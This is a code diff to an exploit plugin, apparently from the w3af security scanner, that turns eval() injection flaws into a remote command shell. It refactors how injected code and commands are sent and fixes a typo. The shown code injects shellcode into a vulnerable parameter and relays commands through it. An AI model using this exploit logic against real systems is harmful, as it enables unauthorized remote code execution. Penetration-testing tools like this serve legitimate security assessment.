@@ -58,7 +58,7 @@ class eval(AttackPlugin):
         Then the exploit plugin that exploits os_commanding
         ( attack.os_commanding ) should return 'os_commanding' in this method.
         """
-        return ['eval',]
+        return ['eval']
 
     def _generate_shell(self, vuln_obj):
         """
@@ -90,21 +90,19 @@ class eval(AttackPlugin):
 
         for code, real_extension, shellcode_generator in shell_code_list:
             # Prepare for exploitation...
-            function_reference = getattr(self._uri_opener,
-                                         vuln_obj.get_method())
-            data_container = vuln_obj.get_dc()
-            data_container[vuln_obj.get_var()] = code
+            mutant = vuln_obj.get_mutant()
+            mutant = mutant.copy()
+            mutant.set_token_value(code)
 
             try:
-                http_res = function_reference(vuln_obj.get_url(),
-                                              str(data_container))
+                http_res = self._uri_opener.send_mutant(mutant)
             except BaseFrameworkException, w3:
                 msg = 'An error occurred while trying to exploit the eval()'\
                       ' vulnerability. Original exception: "%s".'
                 om.out.debug(msg % w3)
             else:
                 if shell_handler.SHELL_IDENTIFIER in http_res.get_body():
-                    msg = 'Sucessfully exploited eval() vulnerability using'\
+                    msg = 'Successfully exploited eval() vulnerability using'\
                           ' the following code snippet: "%s...".' % code[:35]
                     om.out.debug(msg)
                     self._shellcode_generator = shellcode_generator
@@ -150,15 +148,16 @@ class EvalShell(ExecShell):
         :return: The result of the command.
         """
         # Lets send the command.
-        function_reference = getattr(self._uri_opener, self.get_method())
-        exploit_dc = self.get_dc()
-        exploit_dc[self.get_var()] = self.shellcode_generator(command)
+        mutant = self.get_mutant()
+        mutant = mutant.copy()
+        mutant.set_token_value(self.shellcode_generator(command))
 
         try:
-            response = function_reference(self.get_url(), str(exploit_dc))
+            response = self._uri_opener.send_mutant(mutant)
         except BaseFrameworkException, w3:
             msg = 'An error occurred while trying to exploit the eval()'\
-                  ' vulnerability (sending command %s). Original exception: "%s".'
+                  ' vulnerability (sending command %s). Original exception:' \
+                  ' "%s".'
             om.out.debug(msg % (command, w3))
             return 'Unexpected error, please try again.'
         else:
